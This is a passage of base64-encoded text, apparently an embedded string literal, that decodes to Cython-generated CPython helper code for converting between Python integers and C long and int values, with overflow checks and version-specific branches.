AgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7CiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7CiAgICAgICAgZm9yIChiaXRzID0gMDsgYml0cyA8IChpbnQpIHNpemVvZihsb25nKSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0OwogICAgICAgICAgICBsb25nIGlkaWdpdDsKICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzOwog""ICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7CiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDsKICAgICAgICB7CiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihsb25nKSAqIDgpIC0gYml0cyAtIChpc191bnNpZ25lZCA/IDAgOiAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgobG9uZykgMSkgPDwgKHNpemVvZihsb25nKSAqIDggLSAxKSkpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKQogICAgICAgICAgICAgICAgdmFsID0gfnZhbDsKICAgICAgICB9CiAgICAgICAgcmV0ID0gMDsKICAgIGRvbmU6CiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7CiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTsKICAgICAgICBQeV9YREVDUkVGKHN0ZXB2YWwpOwojZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkocmV0KSkKICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQpyYWlzZV9vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwpyYWlzZV9uZWdfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAiY2FuJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSkgewojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaAojcHJhZ21hIEdDQyBkaWFnbm9zdGljIGlnbm9yZWQgIi1XY29udmVyc2lvbiIKI2VuZGlmCiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDsKI2lmZGVmIF9fUHl4X0hBU19HQ0Nf""RElBR05PU1RJQwojcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcAojZW5kaWYKICAgIGNvbnN0IGludCBpc191bnNpZ25lZCA9IG5lZ19vbmUgPiBjb25zdF96ZXJvOwogICAgaWYgKGlzX3Vuc2lnbmVkKSB7CiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8IHNpemVvZihsb25nKSkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nKChsb25nKSB2YWx1ZSk7CiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZygodW5zaWduZWQgbG9uZykgdmFsdWUpOwojaWYgZGVmaW5lZChIQVZFX0xPTkdfTE9ORykgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgIH0gZWxzZSBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZ0xvbmcoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykgdmFsdWUpOwojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTsKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpOwojZW5kaWYKICAgICAgICB9CiAgICB9CiAgICB7CiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWx1ZTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAgICAgICBpZiAoaXNfdW5zaWduZWQpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWROYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbU5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7CiAgICAgICAgfQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICByZXR1cm4gX1B5TG9uZ19Gcm9tQnl0ZUFycmF5KGJ5dGVzLCBzaXplb2YobG9uZyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXR0bGUsICFpc191bnNpZ25lZCk7CiNlbHNlCiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7CiAgICAgICAgUHlPYmplY3Qg""KmZyb21fYnl0ZXMsICpyZXN1bHQgPSBOVUxMLCAqa3dkcyA9IE5VTEw7CiAgICAgICAgUHlPYmplY3QgKnB5X2J5dGVzID0gTlVMTCwgKm9yZGVyX3N0ciA9IE5VTEw7CiAgICAgICAgZnJvbV9ieXRlcyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KikmUHlMb25nX1R5cGUsICJmcm9tX2J5dGVzIik7CiAgICAgICAgaWYgKCFmcm9tX2J5dGVzKSByZXR1cm4gTlVMTDsKICAgICAgICBweV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoKGNoYXIqKWJ5dGVzLCBzaXplb2YobG9uZykpOwogICAgICAgIGlmICghcHlfYnl0ZXMpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgb3JkZXJfc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobGl0dGxlID8gImxpdHRsZSIgOiAiYmlnIik7CiAgICAgICAgaWYgKCFvcmRlcl9zdHIpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqYXJnc1szKyhDWVRIT05fVkVDVE9SQ0FMTCA/IDEgOiAwKV0gPSB7IE5VTEwsIHB5X2J5dGVzLCBvcmRlcl9zdHIgfTsKICAgICAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICAgICAga3dkcyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7CiAgICAgICAgICAgICAgICBpZiAoIWt3ZHMpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKCJzaWduZWQiLCBfX1B5eF9OZXdSZWYoUHlfVHJ1ZSksIGt3ZHMsIGFyZ3MrMywgMCkgPCAwKSBnb3RvIGxpbWl0ZWRfYmFkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihmcm9tX2J5dGVzLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIGt3ZHMpOwogICAgICAgIH0KICAgICAgICBsaW1pdGVkX2JhZDoKICAgICAgICBQeV9YREVDUkVGKGt3ZHMpOwogICAgICAgIFB5X1hERUNSRUYob3JkZXJfc3RyKTsKICAgICAgICBQeV9YREVDUkVGKHB5X2J5dGVzKTsKICAgICAgICBQeV9YREVDUkVGKGZyb21fYnl0ZXMpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgogICAgfQp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKc3RhdGljIF9fUHl4X1R5cGVOYW1lCl9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlUeXBlT2JqZWN0KiB0cCkKewogICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwYjAwMDAKICAgIG5hbWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKChQeU9iamVjdCAqKXRwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg""ICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7CiAgICAjZWxzZQogICAgbmFtZSA9IFB5VHlwZV9HZXRRdWFsTmFtZSh0cCk7CiAgICAjZW5kaWYKICAgIGlmICh1bmxpa2VseShuYW1lID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobmFtZSkpKSBnb3RvIGJhZDsKICAgIG1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7CiAgICBpZiAodW5saWtlbHkobW9kdWxlID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobW9kdWxlKSkpIGdvdG8gYmFkOwogICAgaWYgKFB5VW5pY29kZV9Db21wYXJlV2l0aEFTQ0lJU3RyaW5nKG1vZHVsZSwgImJ1aWx0aW5zIikgPT0gMCkgewogICAgICAgIHJlc3VsdCA9IG5hbWU7CiAgICAgICAgbmFtZSA9IE5VTEw7CiAgICAgICAgZ290byBkb25lOwogICAgfQogICAgcmVzdWx0ID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIiVVLiVVIiwgbW9kdWxlLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gTlVMTCkpIGdvdG8gYmFkOwogIGRvbmU6CiAgICBQeV9YREVDUkVGKG5hbWUpOwogICAgUHlfWERFQ1JFRihtb2R1bGUpOwogICAgcmV0dXJuIHJlc3VsdDsKICBiYWQ6CiAgICBQeUVycl9DbGVhcigpOwogICAgaWYgKG5hbWUpIHsKICAgICAgICByZXN1bHQgPSBuYW1lOwogICAgICAgIG5hbWUgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNCk7CiAgICB9CiAgICBnb3RvIGRvbmU7Cn0KI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKngpIHsKI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQwojcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2gKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iCiNlbmRpZgogICAgY29uc3QgaW50IG5lZ19vbmUgPSAoaW50KSAtMSwgY29uc3RfemVybyA9IChpbnQpIDA7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwb3AKI2VuZGlmCiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybzsKICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrKHgpKSkgewogICAgICAgIGludCB2YWw7CiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7CiAgICAgICAgaWYgKCF0bXApIHJldHVybiAoaW50KSAtMTsKICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfaW50KHRtcCk7CiAgICAgICAgUHlfREVDUkVGKHRtcCk7CiAgICAgICAgcmV0dXJuIHZhbDsKICAgIH0KICAgIGlmIChpc191""bnNpZ25lZCkgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc05lZyh4KSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgo""KCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNwogICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh4LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAg""ICAgIH0gZWxzZSBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0gZWxzZSB7CiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgICAgICBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpOwogICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTsKICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSkgewogICAgICAgICAgICAgICAgY2FzZSAtMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIg""KiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19T